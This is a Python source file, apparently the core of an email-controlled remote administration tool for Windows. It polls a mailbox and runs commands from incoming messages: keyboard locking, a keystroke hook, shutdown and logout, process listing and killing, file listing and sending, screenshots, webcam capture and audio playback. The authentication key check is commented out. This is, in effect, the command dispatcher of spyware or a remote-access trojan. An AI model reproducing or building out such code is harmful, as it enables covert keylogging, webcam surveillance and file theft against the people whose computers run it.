import random
import string
import threading
import time
import win32com.client
import Email
import ManagerKeyboard
import ManagerSystem
import ManagerScreen
import ManagerFile
import ManagerSoft
import ManagerAudio
import ManagerWebcam

class MailBox:
    def __init__(self,factory = None,keyS = ""):
        print("Mailbox Init")
        self.factory = factory
        self.isStart = True
        self.key = keyS

    def utilPath(self,rep):
        return rep.split("\n")[-1]

    def listen(self,msg, email,_callBack = None):
        string = msg.lower().strip().split()
        rep = ""
        if "mapi" == string[0]:
            if "keyboard" == string[1]:
                keyboard = ManagerKeyboard.ManagerKeyBoard(email)
                if "lock" == string[2]:
                    keyboard.lock(_callBack)
                elif "unlock" == string[2]:
                    keyboard.unlock(_callBack)
                elif "state" == string[2]:
                    keyboard.notificationState(_callBack)
                elif "hook" == string[2]:
                    if string[-1] == "hook":
                        number = 60
                    else:
                        number = int(string[-1])
                    keyboard.hook(_callBack,number)

            if "system" == string[1]:
                system = ManagerSystem.ManagerSystem(email)
                if "shutdown" == string[2]:
                    system.shutdown(_callBack)
                elif "logout" == string[2]:
                    system.logout(_callBack)

            if "soft" == string[1]:
                soft = ManagerSoft.ManagerSoft(email)
                if "list" == string[2]:
                    soft.list(msg,_callBack)
                if "kill" == string[2]:
                    soft.kill(msg,_callBack)
                if "start" == string[2]:
                    soft.start(msg,_callBack)

            if "file" == string[1]:
                file = ManagerFile.ManagerFile(email)
                if "list" == string[2]:
                    file.list(msg,_callBack)
                if "send" == string[2]:
                    file.send(msg,_callBack)

            if "screen" == string[1]:
                screen = ManagerScreen.ManagerScreen(email)
                if "scap" == string[2]:
                    screen.scap(_callBack)

            if "webcam" == string[1]:
                cam = ManagerWebcam.ManagerWebcam(email)
                if "scap" == string[2]:
                    cam.turnOn(_callBack)
                    cam.capPicture(_callBack)
                    cam.turnOff(_callBack)
                if "on" == string[2]:
                    cam.turnOn(_callBack)
                if "off" == string[2]:
                    cam.turnOff(_callBack)
            if "audio" == string[1]:
                audio = ManagerAudio.ManagerAudio(email, email.getFiles())
                if "play" == string[2]:
                    audio.play(_callBack)
                if "stop" == string[2]:
                    audio.stop(_callBack)

        return msg + "\nREP:\n" + rep

    def start(self,_callBack = None):
        print("Mailbox Start Enry")
        while self.isStart:
            print("Mailbox Start Read Mail")
            self.mails = self.factory.createMailBox()
            for mailNow in self.mails:
                if (mailNow.isValidate()):
                    #if(mailNow.isKey(self.key)):
                        rep = self.listen(mailNow.getBody(), mailNow,_callBack)
                        print("MailBox Start Rep: " + rep)
                    #else:
                    #    mailNow.sendBack("Your key is wrong","")
                else:
                    print("False" + mailNow.getBody())
                    mailNow.sendBack("Your email not validate","")
            time.sleep(5)

    def stop(self):
        self.isStart = False




